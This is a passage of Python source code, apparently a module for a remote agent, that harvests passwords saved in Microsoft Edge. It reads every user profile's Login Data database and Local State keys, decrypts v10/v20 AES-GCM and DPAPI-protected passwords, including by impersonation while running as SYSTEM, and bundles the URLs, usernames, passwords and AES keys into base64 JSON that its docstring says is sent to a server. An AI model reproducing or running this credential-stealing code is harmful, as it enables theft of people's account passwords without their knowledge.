        nonce = password_blob[3:15]
        if len(nonce) != 12:
            if _debug_logger:
                _debug_logger(f"Nonce has wrong size: {len(nonce)} bytes (expected 12)")
            return None
        
        tag = password_blob[-16:]
        if len(tag) != 16:
            if _debug_logger:
                _debug_logger(f"Tag has wrong size: {len(tag)} bytes (expected 16)")
            return None
        
        ciphertext = password_blob[15:-16]
        if len(ciphertext) == 0:
            if _debug_logger:
                _debug_logger("Ciphertext is empty")
            return None
        
        if _debug_logger:
            _debug_logger(f"Decrypting {version_str}: nonce={len(nonce)}B, ciphertext={len(ciphertext)}B, tag={len(tag)}B, total={len(password_blob)}B")
            _debug_logger(f"Using {'v20-specific' if version_str == 'v20' and aes_keys.get('v20') == aes_key else 'v10/fallback'} key for {version_str}")
        
        aes = AESGCM(aes_key)
        
        decryption_attempts = []
        
        try:
            decrypted = aes.decrypt(nonce, ciphertext + tag, None)
            if _debug_logger:
                _debug_logger(f"{version_str} decryption succeeded with standard format (no associated data)")
            return decrypted.decode('utf-8', errors='ignore')
        except Exception as e1:
            decryption_attempts.append(f"Standard format: {type(e1).__name__}: {e1}")
            if version_str == "v20":
                try:
                    decrypted = aes.decrypt(nonce, ciphertext + tag, b'')
                    if _debug_logger:
                        _debug_logger(f"{version_str} decryption succeeded with empty associated data")
                    return decrypted.decode('utf-8', errors='ignore')
                except Exception as e2:
                    decryption_attempts.append(f"Empty associated data: {type(e2).__name__}: {e2}")
                    
                    try:
                        if len(password_blob) >= 31:
                            alt_tag = password_blob[15:31]
                            alt_ciphertext = password_blob[31:]
                            if len(alt_tag) == 16 and len(alt_ciphertext) > 0:
                                decrypted = aes.decrypt(nonce, alt_ciphertext + alt_tag, None)
                                if _debug_logger:
                                    _debug_logger(f"{version_str} decryption succeeded with alternative format (tag before ciphertext)")
                                return decrypted.decode('utf-8', errors='ignore')
                    except Exception as e3:
                        decryption_attempts.append(f"Alternative format: {type(e3).__name__}: {e3}")
                    
                    try:
                        decrypted = aes.decrypt(nonce, ciphertext + tag, nonce)
                        if _debug_logger:
                            _debug_logger(f"{version_str} decryption succeeded with nonce as associated data")
                        return decrypted.decode('utf-8', errors='ignore')
                    except Exception as e4:
                        decryption_attempts.append(f"Nonce as associated data: {type(e4).__name__}: {e4}")
                    
                    if version_str == "v20" and url:
                        try:
                            url_bytes = url.encode('utf-8')
                            decrypted = aes.decrypt(nonce, ciphertext + tag, url_bytes)
                            if _debug_logger:
                                _debug_logger(f"{version_str} decryption succeeded with URL as associated data")
                            return decrypted.decode('utf-8', errors='ignore')
                        except Exception as e5:
                            decryption_attempts.append(f"URL as associated data: {type(e5).__name__}: {e5}")
                        
                        try:
                            url_bytes_utf16 = url.encode('utf-16-le')
                            decrypted = aes.decrypt(nonce, ciphertext + tag, url_bytes_utf16)
                            if _debug_logger:
                                _debug_logger(f"{version_str} decryption succeeded with URL UTF-16 as associated data")
                            return decrypted.decode('utf-8', errors='ignore')
                        except Exception as e6:
                            decryption_attempts.append(f"URL UTF-16 as associated data: {type(e6).__name__}: {e6}")
                        
                        try:
                            from urllib.parse import urlparse
                            parsed = urlparse(url)
                            hostname_bytes = parsed.netloc.encode('utf-8')
                            decrypted = aes.decrypt(nonce, ciphertext + tag, hostname_bytes)
                            if _debug_logger:
                                _debug_logger(f"{version_str} decryption succeeded with hostname as associated data")
                            return decrypted.decode('utf-8', errors='ignore')
                        except Exception as e7:
                            decryption_attempts.append(f"Hostname as associated data: {type(e7).__name__}: {e7}")
            
            if _debug_logger:
                _debug_logger(f"All {version_str} decryption attempts failed:")
                for attempt in decryption_attempts:
                    _debug_logger(f"  - {attempt}")
            
            raise e1
            
    except Exception as e:
        if _debug_logger:
            _debug_logger(f"AES-GCM decryption exception: {type(e).__name__}: {e}")
        return None


def _extract_credentials_from_profile(profile_path, profile_name, user_profile_path=None):
    """
    Extracts credentials from a specific Edge profile.
    Returns a tuple (credentials, aes_keys) where:
    - credentials: list of dicts with (encrypted) credentials
    - aes_keys: dict with AES keys {"v10": key_bytes, "v20": key_bytes}
    
    Args:
        profile_path: Path to Edge profile folder (e.g. .../User Data/Default)
        profile_name: Profile name (e.g. "Default" or "username/Default")
        user_profile_path: Path to Windows user profile (to find Local State)
    """
    credentials = []
    temp_login_data = None
    temp_local_state = None
    temp_dir = None
    
    try:
        login_data_path = os.path.join(profile_path, "Login Data")
        
        if user_profile_path:
            local_state_path = os.path.join(
                user_profile_path,
                "AppData",
                "Local",
                "Microsoft",
                "Edge",
                "User Data",
                "Local State"
            )
        else:
            local_state_path = os.path.join(os.path.dirname(profile_path), "Local State")
        
        if not os.path.exists(login_data_path):
            return [], {"v10": None, "v20": None}
        
        temp_dir = tempfile.mkdtemp(prefix="edge_creds_")
        temp_login_data = os.path.join(temp_dir, "login_data")
        temp_local_state = os.path.join(temp_dir, "local_state")
        
        try:
            shutil.copy2(login_data_path, temp_login_data)
        except (OSError, PermissionError):
            temp_login_data = login_data_path
        
        aes_keys = {"v10": None, "v20": None}
        if os.path.exists(local_state_path):
            try:
                shutil.copy2(local_state_path, temp_local_state)
                aes_keys = _get_aes_key_from_local_state(temp_local_state)
                if aes_keys.get("v10") or aes_keys.get("v20"):
                    v10_size = len(aes_keys.get("v10")) if aes_keys.get("v10") else 0
                    v20_size = len(aes_keys.get("v20")) if aes_keys.get("v20") else 0
                    if _debug_logger:
                        _debug_logger(f"AES keys extracted: v10={v10_size} bytes, v20={v20_size} bytes")
                else:
                    if _debug_logger:
                        _debug_logger("Failed to extract AES keys from Local State")
            except Exception as e:
                if _debug_logger:
                    _debug_logger(f"Exception extracting AES keys: {e}")
                pass
        
        conn = None
        try:
            if temp_login_data == login_data_path:
                db_uri = f"file:{login_data_path}?mode=ro"
                conn = sqlite3.connect(db_uri, uri=True)
            else:
                conn = sqlite3.connect(temp_login_data)
            
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            
            rows = cursor.fetchall()
            
            for origin_url, username, password_blob in rows:
                encrypted_password_b64 = None
                decrypted_password = None
                encryption_format = None
                
                if password_blob:
                    if len(password_blob) >= 3:
                        version = password_blob[:3]
                        if version in [b'v10', b'v20']:
                            encryption_format = version.decode('utf-8', errors='ignore')
                            
                            if encryption_format == "v20":
                                decrypted = None
                                try:
                                    decrypted = _decrypt_password_v20_com(password_blob, origin_url)
                                    if decrypted:
                                        if _debug_logger:
                                            _debug_logger(f"Password v20 decrypted successfully using COM for {origin_url}")
                                    else:
                                        decrypted = _decrypt_password_aes(password_blob, aes_keys, url=origin_url)
                                        if decrypted:
                                            if _debug_logger:
                                                _debug_logger(f"Password v20 decrypted successfully using AES-GCM for {origin_url}")
                                        
                                except Exception as e:
                                    if _debug_logger:
                                        _debug_logger(f"Password v20 decryption error on agent: {e}")
                                
                                if decrypted:
                                    decrypted_password = decrypted
                                else:
                                    encrypted_password_b64 = base64.b64encode(password_blob).decode('ascii')
                                    if _debug_logger:
                                        _debug_logger(f"Password v20 decryption failed on agent, sending encrypted for {origin_url}")
                            else:
                                encrypted_password_b64 = base64.b64encode(password_blob).decode('ascii')
                        else:
                            encryption_format = "dpapi"
                            try:
                                decrypted = _dpapi_unprotect(password_blob, use_impersonation=True)
                                if decrypted:
                                    decrypted_password = decrypted.decode('utf-8', errors='ignore')
                                    if _debug_logger:
                                        _debug_logger(f"Password DPAPI decrypted successfully on agent for {origin_url}")
                                else:
                                    encrypted_password_b64 = base64.b64encode(password_blob).decode('ascii')
                                    if _debug_logger:
                                        _debug_logger(f"Password DPAPI decryption failed on agent, sending encrypted for {origin_url}")
                            except Exception as e:
                                encrypted_password_b64 = base64.b64encode(password_blob).decode('ascii')
                                if _debug_logger:
                                    _debug_logger(f"Password DPAPI decryption error on agent: {e}, sending encrypted")
                    else:
                        encryption_format = "dpapi"
                        try:
                            decrypted = _dpapi_unprotect(password_blob, use_impersonation=True)
                            if decrypted:
                                decrypted_password = decrypted.decode('utf-8', errors='ignore')
                        except Exception:
                            encrypted_password_b64 = base64.b64encode(password_blob).decode('ascii')
                
                if encrypted_password_b64 or decrypted_password or username:
                    cred_data = {
                        "url": origin_url or "",
                        "username": username or "[NO USERNAME]",
                        "encryption_format": encryption_format,
                        "profile": profile_name
                    }
                    
                    if decrypted_password:
                        cred_data["password"] = decrypted_password
                    elif encrypted_password_b64:
                        cred_data["encrypted_password"] = encrypted_password_b64
                    
                    credentials.append(cred_data)
            
            cursor.close()
            
        except sqlite3.Error:
            pass
        finally:
            if conn:
                conn.close()
        
    except Exception:
        pass
    finally:
        if temp_login_data and temp_login_data != login_data_path:
            try:
                if os.path.exists(temp_login_data):
                    os.remove(temp_login_data)
            except Exception:
                pass
        if temp_local_state:
            try:
                if os.path.exists(temp_local_state):
                    os.remove(temp_local_state)
            except Exception:
                pass
        if temp_dir and os.path.exists(temp_dir):
            try:
                os.rmdir(temp_dir)
            except Exception:
                pass
    
    return credentials, aes_keys


def get_creds_navigator():
    """
    Retrieves credentials and passwords saved in Microsoft Edge.
    Returns a formatted string: SUCCESS|json_base64 or Error: message
    
    Passwords are sent ENCRYPTED to the server with required AES keys.
    The server will decrypt passwords locally.
    
    JSON response format:
    {
        "device_ip": "",
        "timestamp": int,
        "count": int,
        "credentials": [
            {
                "url": str,
                "username": str,
                "encrypted_password": str (base64),
                "encryption_format": str,  # "v10", "v20", or "dpapi"
                "profile": str
            }
        ],
        "aes_keys": {
            "v10": str (base64),
            "v20": str (base64)
        },
        "debug": [str]
    }
    
    Session 0 Note (SYSTEM Service):
    - Script can find and read Edge files from all user profiles
    - AES keys are extracted from Local State and decrypted with DPAPI
    - Passwords remain encrypted and are sent to server for decryption
    """
    global _debug_logger
    debug_messages = []
    
    def debug_log(msg):
        """Adds a debug message and also prints to stderr"""
        debug_messages.append(msg)
        print(f"[DEBUG] {msg}", file=sys.stderr)
    
    _debug_logger = debug_log
    
    if sys.platform != "win32":
        return "Error: CREDS_NAVIGATOR is only supported on Windows."
    
    is_session_0 = False
    if sys.platform == "win32":
        try:
            sess_id = wintypes.DWORD()
            kernel32 = ctypes.windll.kernel32
            if kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sess_id)):
                is_session_0 = (sess_id.value == 0)
                debug_log(f"Session detected: {'Session 0 (SYSTEM)' if is_session_0 else 'User Session'}")
        except Exception as e:
            debug_log(f"Session detection error: {e}")
    
    profiles = _get_all_edge_profiles()
    if not profiles:
        return "Error: Edge Login Data file not found. Edge may not be installed or no credentials saved."
    
    debug_log(f"Edge profiles found: {len(profiles)}")
    
    all_credentials = []
    all_aes_keys = {"v10": None, "v20": None}
    errors = []
    
    for profile_info in profiles:
        try:
            if len(profile_info) == 3:
                profile_path, profile_name, user_profile_path = profile_info
            else:
                profile_path, profile_name = profile_info
                user_profile_path = None
            
            profile_creds, profile_aes_keys = _extract_credentials_from_profile(
                profile_path, 
                profile_name, 
                user_profile_path
            )
            all_credentials.extend(profile_creds)
            
            if profile_aes_keys.get("v10") and not all_aes_keys.get("v10"):
                all_aes_keys["v10"] = profile_aes_keys["v10"]
            if profile_aes_keys.get("v20") and not all_aes_keys.get("v20"):
                all_aes_keys["v20"] = profile_aes_keys["v20"]
        except Exception as e:
            errors.append(f"Profile {profile_name}: {str(e)}")
    
    if not all_credentials:
        error_msg = "No credentials found in Edge."
        if errors:
            error_msg += " Errors: " + "; ".join(errors)
        return f"SUCCESS|{error_msg}"
    
    aes_keys_b64 = {}
    if all_aes_keys.get("v10"):
        aes_keys_b64["v10"] = base64.b64encode(all_aes_keys["v10"]).decode('ascii')
    if all_aes_keys.get("v20"):
        aes_keys_b64["v20"] = base64.b64encode(all_aes_keys["v20"]).decode('ascii')
    
    try:
        response_data = {
            "device_ip": "",
            "timestamp": int(time.time()),
            "count": len(all_credentials),
            "credentials": all_credentials,
            "aes_keys": aes_keys_b64,
            "debug": debug_messages
        }
        
        json_data = json.dumps(response_data, ensure_ascii=False)
        b64_data = base64.b64encode(json_data.encode('utf-8')).decode('ascii')
        b64_data = b64_data.replace('\n', '').replace('\r', '')
        return f"SUCCESS|{b64_data}"
    except Exception as e:
        debug_log(f"JSON encoding error: {e}")
        return f"Error: Failed to encode credentials - {str(e)}"
    finally:
        _debug_logger = None


if __name__ == "__main__":
    result = get_creds_navigator()
    print(result)
